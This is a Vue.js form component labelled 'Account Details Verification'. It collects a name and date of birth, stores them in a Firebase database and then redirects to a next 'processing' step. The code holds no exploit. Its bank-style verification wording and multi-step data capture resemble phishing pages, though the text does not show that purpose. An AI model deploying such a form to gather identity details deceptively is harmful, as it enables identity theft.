<template>
  <div class="App">
    <Head />
    <div class="mainContent">
      <h1 class="text-center">Account Details Verification</h1>
      <div class="card">
        <form class="LoginForm myform" @submit.prevent="handleSubmit">
          <div class="form-group">
            <label style="font-size: 13px; font-family: Work Sans, sans-serif;" for="accountHolderName">
              Account Holder Name <span style="font-size: 13px; color: red;">*</span>
            </label>
            <input
              type="text"
              class="new-control"
              id="accountHolderName"
              name="accountHolderName"
              minlength="3"
              maxlength="30"
              required
              v-model="accountHolderName"
            />
          </div>
          <div class="form-group">
            <label style="font-size: 13px; font-family: Work Sans, sans-serif;" for="dob">
              Date Of Birth (dd/mm/yyyy) <span style="font-size: 13px; color: red;">*</span>
            </label>
            <input
              type="text"
              class="new-control"
              id="dob"
              name="dob"
              maxlength="10"
              placeholder="dd/mm/yyyy" 
              required
              pattern="\d{2}/\d{2}/\d{4}" 
              inputmode="numeric" 
              v-model="dob"
              @input="handleDOBChange"
            />
          </div>
          <div class="text-center">
            <button type="submit" class="submit">
              SUBMIT
            </button>
          </div>
        </form>
      </div>
    </div>
    <Footer/>
  </div>
</template>

<script>
// import { useRouter } from 'vue-router';
import { ref, push, set, getDatabase } from 'firebase/database';
import { app } from './firebase';
import Head from './HeadPage.vue';
import Footer from './FooterPage.vue';
const db = getDatabase(app);

export default {
   components: {
    Head,
    Footer,
  },
  data() {
    return {
      accountHolderName: '',
      dob: '',
    };
  },
  methods: {
    handleDOBChange(event) {
      // Check the date format and set state accordingly
      const dobValue = event.target.value.replace(/\D/g, '');

      // Format the DOB as DD/MM/YYYY with auto-added slashes
      let formattedDOB = dobValue;
      if (dobValue.length > 2) {
        formattedDOB = `${dobValue.slice(0, 2)}/${dobValue.slice(2)}`;
        if (dobValue.length > 4) {
          formattedDOB = `${formattedDOB.slice(0, 5)}/${dobValue.slice(4)}`;
        }
      }

      this.dob = formattedDOB; // Set the formatted DOB value
    },
    handleSubmit() {
      // Prepare the data to be saved
      const userData = {
        Account_Holder_Name: this.accountHolderName,
        Date_Of_Birth: this.dob,
      };

      // Specify the Firebase database reference
      const usersRef = ref(db, 'data'); // Replace 'users' with your desired database path

      // Push the data with a unique key
      const newEntryRef = push(usersRef);

      // Set the data at the generated reference
      set(newEntryRef, userData)
        .then(() => {
          console.log('Data pushed successfully with a unique key.');
          this.$router.push("/prossingtwo");
          // Handle success or navigate to another page
        })
        .catch((error) => {
          console.error('Error pushing data: ', error);
          // Handle error
        });
    },
  },
};
</script>

<style scoped>
/* Add your CSS styles here */
</style>
